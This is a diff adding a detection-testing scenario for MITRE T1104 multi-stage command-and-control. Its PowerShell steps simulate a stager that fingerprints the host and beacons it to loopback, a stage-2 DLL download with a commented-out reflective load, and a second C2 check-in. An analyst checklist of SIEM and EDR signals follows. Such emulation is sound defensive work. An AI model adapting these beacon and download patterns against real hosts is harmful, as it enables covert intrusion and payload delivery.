@@ -1,0 +1,114 @@
+id: T1104_multi_stage_channels
+name: "Multi-Stage Channels"
+mitre_technique: "T1104"
+mitre_tactic: "command_and_control"
+description: >
+  Adversaries use multiple stages of C2 communication — a lightweight Stage 1 implant
+  checks in to receive a more capable Stage 2 payload, which may itself pull a Stage 3
+  full-featured RAT. Each stage uses different infrastructure, protocols, or encryption
+  to frustrate defenders who identify and block one stage. The Stage 1 is typically
+  small and stealthy (a dropper or stager) while Stage 2 contains full C2 capabilities.
+  Cobalt Strike's stager (HTTPS beacon → downloads full Beacon payload) is a classic
+  example. Detection should identify the stager-to-full-implant handoff pattern.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1104/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1104 — Multi-Stage C2 Channel simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate Stage 1 stager — small beacon that fetches Stage 2 payload"
+    command: |
+      Write-Host "[PAS] Stage 1 stager simulation:"
+      Write-Host "[PAS] Real pattern: tiny shellcode/script checks in, downloads full implant"
+
+      # Stage 1: minimal beacon — sends host fingerprint, receives stage 2 URL
+      $s1Beacon = @{
+          host = $env:COMPUTERNAME
+          os   = [System.Environment]::OSVersion.VersionString
+          arch = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
+          pid  = $PID
+      } | ConvertTo-Json -Compress
+      $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s1Beacon))
+
+      try {
+          Invoke-WebRequest -Uri "http://127.0.0.1/stage1?d=$encoded" `
+              -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null
+      } catch {}
+      Write-Host "[PAS] Stage 1 beacon sent — host fingerprint transmitted"
+      Write-Host "[PAS] Stage 1 would receive: URL of Stage 2 payload"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate Stage 2 download and in-memory execution — stager to full RAT handoff"
+    command: |
+      Write-Host "[PAS] Stage 2 payload download simulation:"
+      Write-Host "[PAS] Real pattern: Stage 1 downloads Stage 2 DLL/shellcode directly into memory"
+      Write-Host "[PAS] No file written to disk — [Reflection.Assembly]::Load(bytes) or VirtualAlloc+CreateThread"
+
+      # Simulate the in-memory load (same pattern as T1620 but in C2 context)
+      $stage2Url = "http://127.0.0.1/beacon.dll"
+      try {
+          $response = Invoke-WebRequest -Uri $stage2Url -TimeoutSec 1 `
+              -ErrorAction SilentlyContinue
+          if ($response) {
+              $stage2Bytes = $response.Content
+              Write-Host "[PAS] Stage 2 received: $($stage2Bytes.Length) bytes"
+              # Would load with: [Reflection.Assembly]::Load($stage2Bytes)
+          }
+      } catch {
+          Write-Host "[PAS] Stage 2 download failed (expected — loopback server not running)"
+          Write-Host "[PAS] Simulating in-memory load from dummy bytes:"
+      }
+
+      # Simulate the reflective load attempt (telemetry generation)
+      $dummyBytes = New-Object byte[] 4096
+      [Security.Cryptography.RandomNumberGenerator]::Fill($dummyBytes)
+      Write-Host "[PAS] Stage 2 reflective load telemetry generated (dummy bytes)"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate Stage 2 using different C2 server than Stage 1 — infrastructure separation"
+    command: |
+      Write-Host "[PAS] Stage 2 connects to different C2 infrastructure than Stage 1:"
+      Write-Host "[PAS] Stage 1 C2: 127.0.0.1:80  (takedown of Stage 1 C2 does not lose Stage 2)"
+      Write-Host "[PAS] Stage 2 C2: 127.0.0.1:443 (separate domain, different TLS cert)"
+      try {
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest -Uri "https://127.0.0.1/tasks" `
+              -SkipCertificateCheck -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null
+      } catch {}
+      Write-Host "[PAS] Stage 2 C2 check-in attempt — different destination from Stage 1"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — small HTTP GET followed by large binary download, then second C2 connection to different destination"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1104 cleanup complete — no persistent artifacts"
+
+analyst_checklist:
+  - "Behaviour: small HTTP GET (stager check-in) followed by large binary download from same process"
+  - "Behaviour: process making HTTP connections to two distinct C2 destinations in sequence"
+  - "Script block logging: [Reflection.Assembly]::Load with bytes received from HTTP response"
+  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName == 'powershell.exe' | order by Timestamp — look for sequential connections to different hosts"
+  - "MDE alert: 'Multi-stage malware delivery' or 'Stager downloading second-stage payload'"
+  - "CONTROL CHECK: Memory scanning — Stage 2 loaded reflectively will appear in process memory even without a file on disk"
+  - "CONTROL CHECK: AMSI scans [Reflection.Assembly]::Load content — Stage 2 payload bytes are scanned before execution"
+  - "CONTROL CHECK: Block ALL scripting engine internet access in high-security environments — eliminates the stager download vector"
